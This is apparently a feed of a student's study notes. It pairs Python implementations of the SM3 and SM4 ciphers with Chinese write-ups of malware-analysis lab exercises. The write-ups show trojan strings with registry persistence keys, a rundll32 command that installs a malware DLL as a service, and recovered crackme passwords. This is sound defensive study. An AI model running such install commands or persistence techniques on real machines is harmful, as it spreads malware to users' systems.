当 q 是奇素数 p 时，要求 p &amp;gt; $$2^{191}$$； 当 q 是 2 的方幂 $$2^m$$ 时，要求 m &amp;gt; 192 且为素数。 素域 # 如果是第一种情况，q 是奇素数 p 时，素域 $$F_p$$ 中的元素用 $${0, 1, \cdots, p-1}$$ 表示。
这个域有以下的特点：
加法单位元是整数 0；
乘法单位元是整数 1；
域元素加法是整数模 p 加法：$$a, b \in F_p$$，则 $$a + b \rightarrow (a+b) \pmod{p}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm3/</guid><description>SM 3 # 直接上代码（github）：
import binascii from math import ceil from .func import rotl, bytes_to_list IV = [ 1937774191, 1226093241, 388252375, 3666478592, 2842636476, 372324522, 3817729613, 2969243214, ] T_j = [ 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042 ] def sm3_ff_j(x, y, z, j): if 0 &amp;lt;= j and j &amp;lt; 16: ret = x ^ y ^ z elif 16 &amp;lt;= j and j &amp;lt; 64: ret = (x &amp;amp; y) | (x &amp;amp; z) | (y &amp;amp; z) return ret def sm3_gg_j(x, y, z, j): if 0 &amp;lt;= j and j &amp;lt; 16: ret = x ^ y ^ z elif 16 &amp;lt;= j and j &amp;lt; 64: #ret = (X | Y) &amp;amp; ((2 ** 32 - 1 - X) | Z) ret = (x &amp;amp; y) | ((~ x) &amp;amp; z) return ret def sm3_p_0(x): return x ^ (rotl(x, 9 % 32)) ^ (rotl(x, 17 % 32)) def sm3_p_1(x): return x ^ (rotl(x, 15 % 32)) ^ (rotl(x, 23 % 32)) def sm3_cf(v_i, b_i): w = [] for i in range(16): weight = 0x1000000 data = 0 for k in range(i*4,(i+1)*4): data = data + b_i[k]*weight weight = int(weight/0x100) w.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm4/</guid><description>SM 4 # 直接上代码（github）：
#-*-coding:utf-8-*- import copy from .func import xor, rotl, get_uint32_be, put_uint32_be, \ bytes_to_list, list_to_bytes, padding, unpadding #Expanded SM4 box table SM4_BOXES_TABLE = [ 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c, 0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86, 0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed, 0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa, 0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c, 0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb, 0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25, 0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52, 0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38, 0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34, 0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82, 0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45, 0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf, 0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1, 0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89, 0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39, 0x48, ] # System parameter SM4_FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc] # fixed parameter SM4_CK = [ 0x00070e15,0x1c232a31,0x383f464d,0x545b6269, 0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9, 0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249, 0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9, 0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229, 0x30373e45,0x4c535a61,0x686f767d,0x848b9299, 0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209, 0x10171e25,0x2c333a41,0x484f565d,0x646b7279 ] SM4_ENCRYPT = 0 SM4_DECRYPT = 1 class CryptSM4(object): def __init__(self, mode=SM4_ENCRYPT): self.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</guid><description>README # 这里我们根据攻击者获取密码学系统的信息的多少将攻击模式分为以下几类
唯密文攻击：攻击者仅能获得一些加密过的密文。 已知明文攻击：攻击者有一些密文对应的明文。 选择明文攻击：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。 选择密文攻击：攻击者在开始攻击之前可以选择一些密文，并获取解密后的明文。如果攻击者在攻击图中可以根据已经获取的信息选择一些新的密文并获取对应的明文，则称为适应性选择密文攻击。 相关密钥攻击：攻击者可以获得两个或多个相关密钥的加密或解密后的密文或明文。但是攻击者不知道这些密钥。 根据不同的攻击模式，可能会有不同的攻击方法，目前常见的攻击方法主要有
暴力攻击、中间相遇攻击、线性分析、差分分析、不可能差分分析、积分分析、代数分析、相关密钥攻击、侧信道攻击</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-1/</guid><description>lab 1-1 # QUESTION 1 # Upload the files to http://www.VirusTotal.com/ and view the reports. Does either file match any existing antivirus signatures?
文件上传的 sha256 hash 值为：
$ sha256sum Lab01-01.exe 58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47 Lab01-01.exe 因此上传的 url 为：https://www.virustotal.com/#/file/58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47/detection
可以看到许多病毒引擎都检测到这是一个木马。
QUESTION 2 # When were these files compiled?
PE 文件的文件结构可以参考微软的官方文档。
可以找到在对象文件的的最开始，存在一个标准文件头，其中有一个 TimeDateStamp 域，指示了文件创建时的时间戳，可以使用以下的 python 脚本读取它：
# lab1-1-2.py from datetime import datetime import pefile pe = pefile.PE(&amp;#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe&amp;#34;) print(datetime.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-2/</guid><description>lab 1-2 # QUESTION 1 # Upload the Lab01-02.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?
文件的 sha256 哈希值：
$ sha256sum Lab01-02.exe c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6 Lab01-02.exe 因此上传的 url 为：https://www.virustotal.com/#/file/c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6/detection
可以看到这同样是一个木马。
QUESTION 2 # Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.
使用 blackarch 的工具 packerid 来检测第二个可执行文件的壳：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-3/</guid><description>lab 1-3 # QUESTION 1 # Upload the Lab01-03.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?
文件的 sha256 哈希值：
$ sha256sum Lab01-03.exe 7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec Lab01-03.exe 因此上传的 url 为：https://www.virustotal.com/#/file/7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec/detection
可以看到这同样是一个被 59 个引擎检测出来的木马。
QUESTION 2 # Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.
可以在 Windows 上通过 PEiD 这个软件检验壳：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-4/</guid><description>lab 1-4 # QUESTION 1 # Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?
文件的 sha256 哈希值：
$ sha256sum Lab01-04.exe 0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126 Lab01-04.exe 因此上传的 url 为：https://www.virustotal.com/#/file/0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126/detection
可以看到这同样是一个被 53 个引擎检测出来的木马。
QUESTION 2 # Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.
使用 blackarch 的工具 packerid：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-1/</guid><description>lab 3-1 # QUESTION 1 # What are this malware’s imports and strings?
通过 PEiD 这个软件分析这个病毒：
发现这个病毒使用了 PEncrypt 3.1 加壳了。所以我们并不知道它实际的导入函数。
于是我们通过 strings 命令分析里面的可见字符串：
$ strings Lab03-01.exe !This program cannot be run in DOS mode. Rich .text `.data ExitProcess kernel32.dll ws2_32 # ... CONNECT %s:%i HTTP/1.0 # ... QQVP advpack StubPath SOFTWARE\Classes\http\shell\open\commandV Software\Microsoft\Active Setup\Installed Components\ test www.practicalmalwareanalysis.com admin VideoDriver WinVMX32- vmx32to64.exe SOFTWARE\Microsoft\Windows\CurrentVersion\Run SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders AppData V%X_ 可见加壳后还有一些注册表位置、域名等字符串。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-2/</guid><description>lab 3-2 # QUESTION 1 # How can you get this malware to install itself?
首先查看文件类型：
$ file Lab03-02.dll Lab03-02.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows 因此使用程序 rundll32.exe 安装动态链接库，msdn 使用教程。
我们进一步查看这个动态链接库的导出内容，以查看应该运行哪个函数安装：
因此从名字来判断，有可能是 Install 也有可能是 installA，我们发现前者运行不了，因此安装这个动态链接库的指令为：
$ rundll32.exe Lab03-02.dll, installA QUESTION 2 # regmon # 恢复虚拟机快照到运行动态链接库之前，打开 Regmon，过滤 rundll32.exe 这个可执行文件，再高亮调用的 CreateKey 这个函数，再运行上面安装动态链接库的命令，我们得到以下的结果：
可见这个动态链接库通过 rundll32.exe 创建了一个名为 IPRIP 的服务。
regedit # 我们也可以通过 regedit 观察这个注册表的内容（可以看到其名称为 Intranet Network Awareness (INA+)）：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-3/</guid><description>lab 3-3 # QUESTION 1 # What do you notice when monitoring this malware with Process Explorer?
拿到病毒首先分析是否加壳：
可见其 packer 就是 Visual C++ 6.0，没有进行任何加壳，理论上可以直接分析反汇编代码，但是题目让我们进行动态分析，于是我们再虚拟机中运行这个病毒。
我们首先打开 Procexp 与 Procmon，然后运行 Lab03-03.exe 这个程序：
我们发现 Lab03-03.exe 这个应程序再运行时创建了一个 svchost.exe 的子进程。
另外我们尝试通过 procmon 中过滤 Process Name =is= Lab03-03.exe 进程观察这个进程调用的 API。我们发现这个病毒尝试创建这样一个敏感文件 C:/Windows/System32/svchost.exe：
我们猜测这个病毒可能尝试替换电脑中的 svchost.exe 文件，并且替换电脑的服务进程。
QUESTION 2 # Can you identify any live memory modifications?
同样的我们再 procmon 中添加以下的两条过滤条件：
&amp;#34;Process Name&amp;#34; is &amp;#34;Lab03-03.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-4/</guid><description>lab 3-4 # QUESTION 1 # What happens when you run this file?
拿到病毒首先分析是否加壳：
同样的这个文件也是 Microsoft Visual C++ 6.0，同样理论上也可以直接分析反汇编代码。对于本题我们只需要双击运行即可。
双击运行结果：病毒闪退，然后把自己删掉了。
QUESTION 2 # What is causing the roadblock in dynamic analysis?
这个病毒会检测自己是否被正确执行，然后闪退把自己删除。
QUESTION 3 # Are there other ways to run this program?
分析反汇编代码应该可以观察这个程序需要什么手段才可以正确执行，但是我懒，不想继续分析了。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-1/</guid><description>lab 4-1 # 用 IDA pro 打开文件：
int __cdecl main_0(int argc, const char **argv) { int result; // eax if ( argc == 2 ) { if ( !j_strcmp(argv[1], &amp;#34;topsecret&amp;#34;) ) printf(&amp;#34;You found the password! Congratulations!\n&amp;#34;); else printf(&amp;#34;Fail!\n&amp;#34;); result = 0; } else { printf(&amp;#34;Usage: crackme-123-1 password\n&amp;#34;); result = 1; } return result; } .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-2/</guid><description>Lab 4-2 # 用 IDA pro 打开文件，分析伪代码：
int __cdecl main_0(int argc, const char **argv) { int result; // eax if ( argc == 2 ) { if ( !j_strcmp(argv[1], &amp;#34;alligator&amp;#34;) ) printf(&amp;#34;You found the password! Congratulations!\n&amp;#34;); else printf(&amp;#34;Fail!\n&amp;#34;); result = 0; } else { printf(&amp;#34;Usage: crackme-123-2 password\n&amp;#34;); result = 1; } return result; } 发现与前一个一样，所以同样修改对应的汇编即可。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-3/</guid><description>Lab 4-3 # 还是用 IDA pro 分析，得到伪代码：
signed int __cdecl main_0(int a1, int a2) { signed int result; // eax if ( a1 == 3 ) { if ( !j_strcmp(*(const char **)(a2 + 4), &amp;#34;suffering&amp;#34;) ) { if ( !j_strcmp(*(const char **)(a2 + 8), &amp;#34;succotash&amp;#34;) ) printf(&amp;#34;Congratulations! You found the passwords!\n&amp;#34;); else printf(&amp;#34;Fail! Second word was wrong!\n&amp;#34;); result = 0; } else { printf(&amp;#34;Fail!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-4/</guid><description>Lab 4-4 # 又是用 IDA pro 分析文件，得到：
signed int __cdecl main_0(int a1, const char **a2) { signed int result; // eax if ( a1 == 2 ) { if ( !j_strcmp(*a2, &amp;#34;game3.exe&amp;#34;) ) { if ( !j_strcmp(a2[1], &amp;#34;dromedary&amp;#34;) ) printf(&amp;#34;Congratulations! You solved the crackme puzzle!\n&amp;#34;); else printf(&amp;#34;Incorrect password!\n&amp;#34;); result = 0; } else { printf(&amp;#34;Fail!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/05/lab5-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/05/lab5-1/</guid><description>lab 5-1 # QUESTION 1 # What is the address of DllMain?
我们用 Ida Pro 加载这个动态链接库，在左侧的函数窗口点击 Ctrl+F，输入函数名 DLLMain，即可搜索：
可见其入口地址是 .text:1000D02E。
QUESTION 2 # Use the Imports window to browse to gethostbyname. Where is the import located?
同样的方法在 Import windows 中点击 Ctrl + F，双击进入后：
.idata:100163CC ; struct hostent *__stdcall gethostbyname(const char *name)
.idata:100163CC extrn gethostbyname:dword 可见其地址是 .idata:100163CC
QUESTION 3 # How many functions call gethostbyname?</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-1/</guid><description>lab 6-1 # QUESTION 1 # What is the major code construct found in the only subroutine called by main?
在左侧的函数列表中选择 _main ，然后在右侧可以看到 _main 函数的汇编代码：
.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00401040 _main proc near ; CODE XREF: start+AFp
.text:00401040
.text:00401040 var_4 = dword ptr -4
.text:00401040 argc = dword ptr 8
.text:00401040 argv = dword ptr 0Ch
.text:00401040 envp = dword ptr 10h
.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-2/</guid><description>lab 6-2 # QUESTION 1 # What operation does the first subroutine called by main perform?
查看 _main 的汇编代码：
.text:00401130 ; =============== S U B R O U T I N E =======================================
.text:00401130
.text:00401130 ; Attributes: bp-based frame
.text:00401130
.text:00401130 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00401130 _main proc near ; CODE XREF: start+AFp
.text:00401130
.text:00401130 var_8 = byte ptr -8
.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-3/</guid><description>lab 6-3 # QUESTION 1 # Compare the calls in main to Lab 6-2’s main method. What is the new function called from main?
后面多出了 sub_401130 这个函数。
QUESTION 2 # What parameters does this new function take?
Ida Pro 将函数声明生成了以下的伪代码：
int __cdecl sub_401130(char, LPCSTR lpExistingFileName) 其传入的参数是一个字符型的变量，一个指向文件名的字符指针。
QUESTION 3 # What major code construct does this function contain?
主要是一个 switch case 语句：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-4/</guid><description>lab 6-4 # QUESTION 1 # What is the difference between the calls made from the main method in Labs 6-3 and 6-4?
分别考虑下面的函数：
sub_401000：这个函数在两个 lab 中是相同的，都是用于检测网络的连通性； sub_401040：也是相同的，下载网页的文件然后解析其中的内容； sub_401050：就是在 lab3 中的 sub_401130 这个函数，通过传入一个字符执行不同的命令； sub_4012B5：在 lab2 中分析的可能是 printf 的函数。 QUESTION 2 # What new code construct has been added to main?
在检测了网络的连通性之后，添加了一个 for 循环。其代码结构是 cmp 和 jge 组成的：
loc_40125A:
cmp [ebp+var_C], 5A0h
jge short loc_4012AF 另外还在 for 循环结束添加了 sleep 函数：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-1/</guid><description>lab 7-1 # QUESTION 1 # How does this program ensure that it continues running (achieves persistence) when the computer is restarted?
